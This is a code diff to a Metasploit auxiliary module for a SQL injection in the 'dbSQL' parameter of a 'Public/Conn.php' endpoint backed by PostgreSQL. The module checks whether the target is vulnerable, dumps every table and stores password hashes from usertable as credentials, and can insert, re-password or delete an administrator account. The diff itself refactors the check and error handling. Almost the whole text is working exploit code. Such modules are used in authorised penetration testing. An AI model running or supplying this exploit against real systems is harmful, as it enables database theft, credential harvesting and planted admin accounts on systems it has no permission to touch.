@@ -54,34 +54,45 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check
-    @sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|
-      res = send_request_cgi(
-        'method' => 'POST',
-        'uri' => normalize_uri(target_uri, 'Public', 'Conn.php'),
-        'vars_post' => {
-          'dbAction' => 'S',
-          'dbSQL' => payload
-        }
-      )
-      fail_with Failure::Unreachable, 'Failed to send HTTP request' unless res
-      fail_with Failure::NotVulnerable, "Got #{res.code} response code" unless res.code == 200
-
-      res.body[%r{<column>(.+)</column>}m, 1] || ''
-    end
-
-    @sqli.test_vulnerable ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
+  def vulnerable_request(payload)
+    send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri, 'Public', 'Conn.php'),
+      'vars_post' => {
+        'dbAction' => 'S',
+        'dbSQL' => payload
+      }
+    )
   end
 
-  def perform_sqli
-    print_good "DBMS version: #{@sqli.version}"
-    table_names = @sqli.enum_table_names
+  def check
+    check_error = nil
+    sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|
+      res = vulnerable_request(payload)
+      if res && res.code == 200
+        res.body[%r{<column>(.+)</column>}m, 1] || ''
+      else
+        if res
+          check_error = Exploit::CheckCode::Safe
+        else
+          check_error = Exploit::CheckCode::Unknown('Failed to send HTTP request') 
+        end
+        '' # because a String is expected, this will make test_vulnerable to return false, but we will just get check_error
+      end
+    end
+    vulnerable_test = sqli.test_vulnerable
+    check_error || (vulnerable_test ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe)
+  end
+
+  def dump_data(sqli)
+    print_good "DBMS version: #{sqli.version}"
+    table_names = sqli.enum_table_names
     print_status 'Enumerating tables'
     table_names.each do |table_name|
-      cols = @sqli.enum_table_columns(table_name)
+      cols = sqli.enum_table_columns(table_name)
       vprint_good "#{table_name}(#{cols.join(',')})"
       # retrieve the data from the table
-      content = @sqli.dump_table_fields(table_name, cols)
+      content = sqli.dump_table_fields(table_name, cols)
       # store hashes as credentials
       if table_name == 'usertable'
         user_ind = cols.index('username')
@@ -112,29 +123,29 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def add_user
+  def add_user(sqli)
     if datastore['Admin_Username'].nil?
       fail_with Failure::BadConfig, 'You must specify a username when adding a user'
     end
     admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'] || '')
     user_exists_sql = "select count(1) from usertable where username='#{datastore['Admin_Username']}'"
     # check if user exists, if yes, just change his password
-    if @sqli.run_sql(user_exists_sql).to_i == 0
+    if sqli.run_sql(user_exists_sql).to_i == 0
       print_status 'User not found on the target, inserting'
-      @sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
+      sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
       "'#{datastore['Admin_Username']}', '#{admin_hash}', 1)")
     else
       print_status 'User already exists, updating the password'
-      @sqli.run_sql("update usertable set userpassword='#{admin_hash}' where " \
+      sqli.run_sql("update usertable set userpassword='#{admin_hash}' where " \
       "username='#{datastore['Admin_Username']}'")
     end
   end
 
-  def remove_user
+  def remove_user(sqli)
     if datastore['Admin_Username'].nil?
       fail_with Failure::BadConfig, 'You must specify a username when adding a user'
     end
-    @sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
+    sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
   end
 
   def run
@@ -143,10 +154,19 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     print_good 'Target seems vulnerable'
+    sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|
+      res = vulnerable_request(payload)
+      if res && res.code == 200
+        res.body[%r{<column>(.+)</column>}m, 1] || ''
+      else
+        fail_with Failure::Unreachable, 'Failed to send HTTP request' unless res
+        fail_with Failure::NotVulnerable, "Got #{res.code} response code" unless res.code == 200
+      end
+    end
     case action.name
-    when 'SQLI_DUMP' then perform_sqli
-    when 'ADD_ADMIN' then add_user
-    when 'REMOVE_ADMIN' then remove_user
+    when 'SQLI_DUMP' then dump_data(sqli)
+    when 'ADD_ADMIN' then add_user(sqli)
+    when 'REMOVE_ADMIN' then remove_user(sqli)
     else
       fail_with(Failure::BadConfig, "#{action.name} not defined")
     end
